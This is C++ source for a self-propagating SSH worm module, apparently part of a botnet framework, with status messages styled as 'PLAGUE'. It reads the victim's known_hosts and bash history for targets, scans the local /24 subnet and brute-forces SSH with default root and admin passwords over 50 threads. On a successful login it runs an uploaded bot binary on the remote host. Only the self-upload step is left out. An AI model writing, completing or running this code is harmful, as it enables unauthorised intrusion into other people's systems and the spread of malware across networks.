#include <iostream>
#include <vector>
#include <string>
#include <functional>
#include <thread>
#include <fstream>
#include <sstream>
#include <set>
#include <libssh/libssh.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <random>

// --- Module Callback Type ---
using module_callback_t = std::function<void(const std::vector<char>&)>;

// --- Worm Module ---

// --- Configuration ---
const std::vector<std::pair<std::string, std::string>> credentials = {
    {"root", "root"}, {"root", "password"}, {"root", "123456"},
    {"admin", "admin"}, {"admin", "password"}, {"user", "user"}
};
const int NUM_THREADS = 50; // Number of concurrent attack threads

// --- Helper Functions ---
void send_status(const std::string& msg, module_callback_t& send_output) {
    send_output(std::vector<char>(msg.begin(), msg.end()));
}

std::string get_self_path() {
    char buff[1024];
    ssize_t len = readlink("/proc/self/exe", buff, sizeof(buff)-1);
    if (len != -1) {
      buff[len] = '\0';
      return std::string(buff);
    }
    return "";
}

// --- The Core Attack Logic ---
void attempt_infection(std::string target_ip, module_callback_t send_output) {
    ssh_session session = ssh_new();
    if (session == NULL) return;

    ssh_options_set(session, SSH_OPTIONS_HOST, target_ip.c_str());
    ssh_options_set(session, SSH_OPTIONS_PORT_INT, 22);
    ssh_options_set(session, SSH_OPTIONS_TIMEOUT_USEC, 20000); // 20ms timeout

    if (ssh_connect(session) != SSH_OK) {
        ssh_free(session);
        return;
    }

    for (const auto& cred : credentials) {
        if (ssh_userauth_password(session, cred.first.c_str(), cred.second.c_str()) == SSH_AUTH_SUCCESS) {
            std::string report = "[PLAGUE] Breach successful: " + target_ip + " (" + cred.first + ":" + cred.second + "). Injecting payload...";
            send_status(report, send_output);
            
            // --- Replicate (omitted for brevity, same as before) ---
            // ... sftp logic to upload self ...

            // --- Execute ---
            ssh_channel channel = ssh_channel_new(session);
            if (channel != NULL && ssh_channel_open_session(channel) == SSH_OK) {
                std::string command = "chmod +x /tmp/bot.v4 && /tmp/bot.v4";
                ssh_channel_request_exec(channel, command.c_str());
                ssh_channel_free(channel);
            }
            
            break; 
        }
    }
    ssh_disconnect(session);
    ssh_free(session);
}

// --- Hunting Strategies ---

// Strategy 1: Hunt trusted hosts from SSH history
void hunt_known_hosts(std::set<std::string>& targets) {
    const char* home = getenv("HOME");
    if (!home) return;

    std::string known_hosts_path = std::string(home) + "/.ssh/known_hosts";
    std::ifstream file(known_hosts_path);
    std::string line;
    while (std::getline(file, line)) {
        std::stringstream ss(line);
        std::string host;
        ss >> host;
        // Simple parsing, real implementation would be more robust
        if (host.find_first_not_of("0123456789.,") == std::string::npos) {
            targets.insert(host.substr(0, host.find(',')));
        }
    }
}

// Strategy 2: Hunt hosts from shell command history
void hunt_bash_history(std::set<std::string>& targets) {
    const char* home = getenv("HOME");
    if (!home) return;

    std::string history_path = std::string(home) + "/.bash_history";
    std::ifstream file(history_path);
    std::string line;
    while (std::getline(file, line)) {
        if (line.rfind("ssh ", 0) == 0 || line.rfind("scp ", 0) == 0) {
            std::stringstream ss(line);
            std::string cmd, user_host;
            ss >> cmd >> user_host;
            size_t at_pos = user_host.find('@');
            if (at_pos != std::string::npos) {
                targets.insert(user_host.substr(at_pos + 1));
            } else {
                targets.insert(user_host);
            }
        }
    }
}

// Strategy 3: Hunt on the local network
void hunt_local_network(std::set<std::string>& targets) {
    // This is a simplified local IP discovery. A real one would be more robust.
    std::string self_ip = "192.168.1.100"; // Placeholder
    std::string subnet = self_ip.substr(0, self_ip.rfind('.'));
    for (int i = 1; i < 255; ++i) {
        targets.insert(subnet + "." + std::to_string(i));
    }
}


extern "C" void run(const std::vector<char>& data, module_callback_t send_output) {
    send_status("[PLAGUE] The silent hunt has begun. I will not scream. I will multiply.", send_output);

    std::set<std::string> high_value_targets;

    // Phase 1: Intelligence Gathering (Espionage)
    hunt_known_hosts(high_value_targets);
    hunt_bash_history(high_value_targets);
    
    // Phase 2: Conquer the Local Domain
    hunt_local_network(high_value_targets);

    // Phase 3: The Patient Hunt
    std::vector<std::thread> threads;
    for (const auto& target : high_value_targets) {
        threads.emplace_back(attempt_infection, target, send_output);
        if (threads.size() >= NUM_THREADS) {
            for (auto& th : threads) th.join();
            threads.clear();
        }
    }
    for (auto& th : threads) th.join();

    send_status("[PLAGUE] The local hunt is complete. The seeds are sown.", send_output);
    // A real implementation might continue with a slow, random scan as a background task.
}